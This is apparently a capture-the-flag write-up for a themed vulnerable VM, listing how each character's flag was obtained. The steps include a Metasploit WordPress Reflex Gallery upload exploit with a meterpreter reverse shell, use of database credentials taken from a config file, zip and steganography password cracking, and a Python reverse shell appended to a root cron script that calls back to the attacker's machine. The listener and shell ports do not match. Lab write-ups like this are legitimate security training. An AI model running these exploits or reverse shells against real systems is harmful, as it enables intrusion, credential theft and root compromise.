# Used information/Commands

In this file, there are more concrete attempts, that helped me to reach the flags. In the last section `Flags`, there is a detailed explanation on how each flag was obtained.

VM IP - {TARGET_MACHINE_IP}

WPScan API token - {API_TOKEN}

## Flags

### Amy

After analysing the WordPress scan, we found a vulnerability that can be exploited using a Metasploit. So, we follow the scan output and use the exploit on `https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_reflexgallery_file_upload/` on the WordPress website base `http://{TARGET_MACHINE_IP}/music/wordpress` and do:

```bash
   $ msf(exploit/unix/webapp/wp_reflexgallery_file_upload) > show options

   Module options (exploit/unix/webapp/wp_reflexgallery_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, soc
                                         ks5h
   RHOSTS     {TARGET_MACHINE_IP}        yes       The target host(s), see <https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html>
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /music/wordpress yes       The base path to the wordpress application
   VHOST                       no        HTTP server virtual host

   Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  {LOCAL_MACHINE_IP}        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   Exploit target:

   Id  Name
   --  ----
   0   Reflex Gallery 3.1.3
```

After this exploit with these settings, insert `shell` to create a shell, go to `/home/amy`, do cat of the file `secretdiary`, find the flag there

### Bernardette

Knowing the files of the webserver are at `/var/www/html/`, we go into that directory and search around.

We then go inside `private/db_config.php` and do:

```bash
   $ cat db_config.php
   <?php
      // Create connection
      $DBUSER = 'bigpharmacorp';
      $DBPASS = 'weareevil';

      $con=mysqli_connect("127.0.0.1",$DBUSER,$DBPASS,"bigpharmacorp");

      // Check connection
      if (mysqli_connect_errno($con))
      {
         echo "<font style=\"color:#FF0000\">Could not connect:". mysqli_connect_error()."</font\>";
      }
   ?>
```

Since we got the credentials, we go to shell we got from the Metasploit and use the credentails to connect to the database and we get the following output, and after some research, we find a flag:

```bash
   $ mysql -h 127.0.0.1 -u bigpharmacorp -p'weareevil' -e 'SHOW TABLES FROM bigpharmacorp;'
   mysql: [Warning] Using a password on the command line interface can be insecure.
   Tables_in_bigpharmacorp
   products
   users

   #Get all users information

   $ mysql -h 127.0.0.1 -u bigpharmacorp -p'weareevil' -e 'SELECT * FROM bigpharmacorp.users';
   mysql: [Warning] Using a password on the command line interface can be insecure.
   id      username        password        fname   description
   1       admin   3fc0a7acf087f549ac2b266baf94b8b1        josh    Dont mess with me
   2       bobby   8cb1fb4a98b9c43b7ef208d624718778        bob     I like playing football.
   3       penny69 cafa13076bb64e7f8bd480060f6b2332        penny   Hi I am Penny I am new here!! <3
   4       mitsos1981      05d51709b81b7e0f1a9b6b4b8273b217        dimitris        Opa re malaka!
   5       alicelove       e146ec4ce165061919f887b70f49bf4b        alice   Eat Pray Love
   6       bernadette      dc5ab2b32d9d78045215922409541ed7        bernadette      FLAG-bernadette{f42d950ab0e966198b66a5c719832d5f}
```

### Raj

After going inside the `{TARGET_MACHINE_IP}/phpmyadmin` and logging in using the DB credentials, we export the DB and check for a any information, maybe a flag.

In this case, it is inside of a post

`FLAG-raz{40d17a74e28a62eac2df19e206f0987c}`

Inside the following object:

```bash
(39, 1, '2020-03-04 15:04:50', '2020-03-04 15:04:50', '<!-- wp:core-embed/youtube {"url":"https://www.youtube.com/watch?v=CevxZvSJLk8","type":"video","providerNameSlug":"youtube","className":"wp-embed-aspect-16-9 wp-has-aspect-ratio"} -->\n<figure class="wp-block-embed-youtube wp-block-embed is-type-video is-provider-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">\nhttps://www.youtube.com/watch?v=CevxZvSJLk8\n</div></figure>\n<!-- /wp:core-embed/youtube -->\n\n<!-- wp:core-embed/youtube {"url":"https://www.youtube.com/watch?v=kffacxfA7G4","type":"video","providerNameSlug":"youtube","className":"wp-embed-aspect-4-3 wp-has-aspect-ratio"} -->\n<figure class="wp-block-embed-youtube wp-block-embed is-type-video is-provider-youtube wp-embed-aspect-4-3 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">\nhttps://www.youtube.com/watch?v=kffacxfA7G4\n</div></figure>\n<!-- /wp:core-embed/youtube -->\n\n<!-- wp:paragraph -->\n<p>FLAG-raz{40d17a74e28a62eac2df19e206f0987c}</p>\n<!-- /wp:paragraph -->', 'Secret notes', '', 'inherit', 'closed', 'closed', '', '30-revision-v1', '', '', '2020-03-04 15:04:50', '2020-03-04 15:04:50', '', 30, 'http://192.168.1.105/music/wordpress/index.php/2020/03/04/30-revision-v1/', 0, 'revision', '', 0);
```

### Sheldon

After doing a full `nmap` (to all ports), we do a more details `nmap` to port 1337, and we find a flag

```bash
   $ sudo nmap -p1337 -sV {TARGET_MACHINE_IP}

   Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-11-08 06:19 EST
   Nmap scan report for {TARGET_MACHINE_IP}
   Host is up (0.022s latency).

   PORT     STATE SERVICE VERSION
   1337/tcp open  waste?
   1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <https://nmap.org/cgi-bin/submit.cgi?new-service> :
   SF-Port1337-TCP:V=7.95%I=7%D=11/8%Time=690F2747%P=x86_64-pc-linux-gnu%r(NU
   SF:LL,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(GenericLine
   SF:s,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(GetRequest,2
   SF:F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(HTTPOptions,2F,
   SF:"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(RTSPRequest,2F,"F
   SF:LAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(RPCCheck,2F,"FLAG-s
   SF:heldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(DNSVersionBindReqTCP,2F,
   SF:"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(DNSStatusRequestT
   SF:CP,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(Help,2F,"FL
   SF:AG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(SSLSessionReq,2F,"FL
   SF:AG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(TerminalServerCookie
   SF:,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(TLSSessionReq
   SF:,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(Kerberos,2F,"
   SF:FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(SMBProgNeg,2F,"FLA
   SF:G-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(X11Probe,2F,"FLAG-she
   SF:ldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(FourOhFourRequest,2F,"FLAG
   SF:-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(LPDString,2F,"FLAG-she
   SF:ldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(LDAPSearchReq,2F,"FLAG-she
   SF:ldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(LDAPBindReq,2F,"FLAG-sheld
   SF:on{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(SIPOptions,2F,"FLAG-sheldon{
   SF:cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(LANDesk-RC,2F,"FLAG-sheldon{cf8
   SF:8b37e8cb10c4005c1f2781a069cf8}\n")%r(TerminalServer,2F,"FLAG-sheldon{cf
   SF:88b37e8cb10c4005c1f2781a069cf8}\n")%r(NCP,2F,"FLAG-sheldon{cf88b37e8cb1
   SF:0c4005c1f2781a069cf8}\n")%r(NotesRPC,2F,"FLAG-sheldon{cf88b37e8cb10c400
   SF:5c1f2781a069cf8}\n")%r(JavaRMI,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f27
   SF:81a069cf8}\n")%r(WMSRequest,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a
   SF:069cf8}\n")%r(oracle-tns,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069
   SF:cf8}\n")%r(ms-sql-s,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\
   SF:n")%r(afp,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(giop
   SF:,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n");
```

### Howard

Inside the `howard` directory, we have an encrypted zip. To unencrypt it, we can use `john` to crack the password.

Use zip2john to put the zip into an hash

```bash
   zip2john super_secret_nasa_stuff_here.zip > zip-hash.txt
```

Then use john to crack:

```bash
   $ john --wordlist=/usr/share/wordlists/rockyou.txt zip-hash.txt

   Using default input encoding: UTF-8
   Loaded 1 password hash (PKZIP [32/64])
   Will run 4 OpenMP threads
   Press 'q' or Ctrl-C to abort, almost any other key for status
   astronaut        (super_secret_nasa_stuff_here.zip/marsroversketch.jpg)     
   1g 0:00:00:00 DONE (2025-11-08 06:39) 100.0g/s 7372Kp/s 7372Kc/s 7372KC/s ryanscott..compusa
   Use the "--show" option to display all of the cracked passwords reliably
   Session completed.
```

Inside of it, there is an image, that we are going to try and check if it has anything hidden. To hide something inside an image you always need a password, so we are going to install `stegcracker` to also brute-force the password

```bash
   $ stegcracker marsroversketch.jpg

   StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
   Copyright (c) 2025 - Luke Paris (Paradoxis)

   StegCracker has been retired following the release of StegSeek, which 
   will blast through the rockyou.txt wordlist within 1.9 second as opposed 
   to StegCracker which takes ~5 hours.

   StegSeek can be found at: https://github.com/RickdeJager/stegseek

   No wordlist was specified, using default rockyou.txt wordlist.
   Counting lines in wordlist..
   Attacking file 'marsroversketch.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
   Successfully cracked file with password: iloveyoumom
   Tried 51221 passwords
   Your file has been written to: marsroversketch.jpg.out
   iloveyoumom
```

Then, we get file `marsroversketch.jpg.out` and read it, that has howard's flag

`FLAG-howard{b3d1baf22e07874bf744ad7947519bf4}`

### Penny

We go inside the shell we got from the Metasploit and go into `/home/penny`

We list all files inside the directory and find the file `.FLAG.penny.txt`

And we find an encode string, we decode it and find the flag

```bash
   $ echo 'RkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y4OTlkZmIzNDIzYTk5MmIyNX0=' | base64 -d
   FLAG-penny{dace52bdb2a0b3f899dfb3423a992b25}
```

### Leonard

We list all files inside `/home/leonard` and find that the script `thermostat_set_temp.sh` has root permissions

Then I check if target machine has python

Since we know now that the target has python, we can create a reverse shell with python (go to `revshells.com` and choose one with python since the system has python)

On my machine:

```bash
   $ nc -lvnp 9002
   # And wait until a shell is created
```

Then, on the target machine, add a reverse shell to the script that has root permissions `thermostat_set_temp.sh`

The following command adds a line to the script, since we can't edit it using nano, for example.
Since we have the information that the script is executed every minute (from what Leonard had in one of his files), the instruction it will eventually be executed and the shell will be created

```bash
   echo "export RHOST="{LOCAL_MACHINE_IP}";export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'" >> thermostat_set_temp.sh
```

Then we can check the shell on our side and get the flag

`FLAG-leonard{17fc95224b65286941c54747704acd3e}`
